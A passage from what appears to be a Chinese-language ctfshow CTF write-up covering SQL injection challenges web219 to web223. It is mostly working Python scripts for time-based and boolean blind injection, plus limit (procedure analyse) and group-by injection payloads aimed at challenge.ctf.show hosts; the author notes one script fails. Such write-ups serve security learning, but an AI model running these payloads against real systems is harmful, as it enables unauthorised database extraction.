ctfshow_flagxca),9,36)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h1 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h1><p>最后一个盲注了，赶紧做完赶紧润。<br>过滤了substr，可以用正则，left都可以。用limit代替group_concat() </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 13:25   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://2db91241-b5ab-4eec-9035-df2df4f18a46.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select table_name from information_schema.tables where table_schema = database() limit 0,1&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select column_name from information_schema.columns where table_name = &quot;ctfshow_flagxcac&quot; limit 1,1&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;select flagaabcc from ctfshow_flagxcac&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1) or if(left((&#123;&#125;),&#123;&#125;)=(&#x27;&#123;&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, res + j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>


<p>其他脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">&quot;select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://d82b1a0b-aba4-4fed-aa83-62d59d7df4ee.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#1) and if((database())regexp(&#x27;^ctfshow&#x27;),(select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f),0)#</span></span><br><span class="line"><span class="comment">#payload = &quot;1) and if((database())regexp(&#x27;^&#123;&#125;&#x27;),(&#123;&#125;),0)#&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;1) and if((select table_name from information_schema.tables where table_schema=database() limit 0,1)regexp(&#x27;^&#123;&#125;&#x27;),(&#123;&#125;),0)#&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;1) and if((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1)regexp(&#x27;^&#123;&#125;&#x27;),(&#123;&#125;),0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;1) and if((select flagaabcc from ctfshow_flagxcac limit 0,1)regexp(&#x27;^&#123;&#125;&#x27;),(&#123;&#125;),0)#&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(flag + j,bypass),</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">3</span> <span class="keyword">and</span> end - start &lt; <span class="number">5</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*] 开始盲注第&#123;&#125;位&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[*] flag is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h1 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/99980.htm"><strong>https://www.jb51.net/article/99980.htm</strong></a></p>
</blockquote>
<h3 id="limit注入-MySQL利用procedure-analyse-函数优化表结构-这个题本质就是报错注入"><a href="#limit注入-MySQL利用procedure-analyse-函数优化表结构-这个题本质就是报错注入" class="headerlink" title="limit注入 MySQL利用procedure analyse()函数优化表结构 这个题本质就是报错注入"></a>limit注入 MySQL利用procedure analyse()函数优化表结构 这个题本质就是报错注入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = select * <span class="keyword">from</span> ctfshow_user limit ($page-<span class="number">1</span>)*$limit,$limit;</span><br></pre></td></tr></table></figure>
<p>注入点在get处，limit注入使用标准：<br><code>select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code><br>修改为payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=<span class="number">1</span>&amp;limit=<span class="number">1</span> procedure analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database())),<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689329494340-363ae1db-f3a1-4694-9bad-d0ec6cc660b7.png" alt="image.png"><br>直接交数据库名即可</p>
<h1 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h1><h3 id="group-by注入"><a href="#group-by注入" class="headerlink" title="group by注入"></a>group by注入</h3><p>直接在group by的位置注入即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">form.on(<span class="string">&#x27;submit(*)&#x27;</span>, function(data)&#123;</span><br><span class="line">    var table = layui.table;</span><br><span class="line">    table.reload(<span class="string">&#x27;user_table&#x27;</span>, &#123;</span><br><span class="line">      url:<span class="string">&#x27;api/?u=username&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> false; </span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  $sql = select * <span class="keyword">from</span> ctfshow_user group by $username;</span><br></pre></td></tr></table></figure>
<p>直接用时间盲注即可：<br>测试时会发现sleep的值会被方法二十倍。<br><code>?u=sleep(0.5)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689331879814-ce852ff0-cdee-4a48-9eda-66304003d4b5.png" alt="image.png"><br>然后就使用之前的时间盲注脚本即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://0750fdff-bead-49bc-b6cb-501f23e1457d.challenge.ctf.show/api/?u=&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;_abcdefghijklmnopqrstuvwxyz0123456789,&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flaga&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;substr((select group_concat(flagaabc) from ctfshow_flaga),1,48)&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),sleep(0.05),1)&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url=url + payload.<span class="built_in">format</span>(inside, i, j), timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h1 id="web223（勾吧题，做破防了）"><a href="#web223（勾吧题，做破防了）" class="headerlink" title="web223（勾吧题，做破防了）"></a>web223（勾吧题，做破防了）</h1><p>提示用户名不能用数字，因此可以用true代替，但是用true的代价就是一次循环20s，那就用布尔盲注代替。<br>看了wp发现使用的非常巧妙：<br>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(true,username,false)</span><br></pre></td></tr></table></figure>
<p>如果返回true时，就会执行<code>group by username</code>，导致参数变多：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689334070399-917c5ad2-3dc9-4c8b-b024-ab234ed78616.png" alt="image.png"><br>而false时，返回false字符串，数据就相对较少：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689334102676-c0d798b5-618c-4450-98f9-f1ee4247ba16.png" alt="image.png"><br>因此可以做出盲注，构建脚本:<br>注意，这里过滤了数字1，因此只能用true代替。<br>给我杀了把 傻逼题，勾吧脚本真不知道哪错了：（这个脚本出不来，但是真不想改了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注3.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 19:29   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_true</span>(<span class="params">num</span>):</span><br><span class="line">    res = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    res += (num - <span class="number">1</span>) * <span class="string">&#x27;+true&#x27;</span></span><br><span class="line">    <span class="comment"># print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkNum</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">elif</span> s <span class="keyword">in</span> <span class="string">&#x27;0123456789&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> calculate_true(<span class="built_in">int</span>(s))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://364e23b2-79ce-4183-a604-8d8d1666bd18.challenge.ctf.show/api/?u=&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line">inside = <span class="string">&quot;database()&quot;</span></span><br><span class="line"><span class="comment"># inside = &quot;admin&#x27;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># inside = &quot;admin&#x27;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># inside = &quot;admin&#x27;and+if(mid((select group_concat(f1ag) from ctfshow_flxg),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;if(substr((&#123;&#125;),&#123;&#125;,1)=(&quot;&#123;&#125;&quot;),username,false)&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        nurl = url</span><br><span class="line">        nurl += payload.<span class="built_in">format</span>(inside, calculate_true(i), checkNum(j)).replace(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;true&#x27;</span>) <span class="comment"># 1被过滤了，别忘了</span></span><br><span class="line">        r = requests.post(nurl)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="comment"># print(nurl)</span></span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;AUTO&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>
<p>看看远处的正确脚本吧：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://90b8ab81-6a05-4ebc-ab88-62e8442c0e89.challenge.ctf.show/api/?u=&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num2true</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;(&#x27;</span> + <span class="string">&#x27;true%2b&#x27;</span> * (num-<span class="number">1</span>) + <span class="string">&#x27;true)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">a = num2true(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="built_in">min</span>,<span class="built_in">max</span> = <span class="number">32</span>, <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        j = <span class="built_in">min</span> + (<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == j):</span><br><span class="line">            <span class="built_in">str</span> += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 爆表名</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;</span></span><br><span class="line">        <span class="comment"># 爆列</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;</span></span><br><span class="line">        <span class="comment"># 爆值</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select group_concat(flagasabc) from ctfshow_flagas),<span class="subst">&#123;num2true(i)&#125;</span>,true))&lt;<span class="subst">&#123;num2true(j)&#125;</span>,username,true)&quot;</span></span><br><span class="line">        r = requests.get(url=url+payload).text</span><br><span class="line">        <span class="comment"># print(r)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;passwordAUTO&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="built_in">max</span> = j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = j</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#import time</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateNum</span>(<span class="params">num</span>):</span><br><span class="line">    res = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num-<span class="number">1</span>):</span><br><span class="line">            res += <span class="string">&quot;+true&quot;</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ce009cf2-8652-4737-ba07-b3bfc3bc3a4a.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span 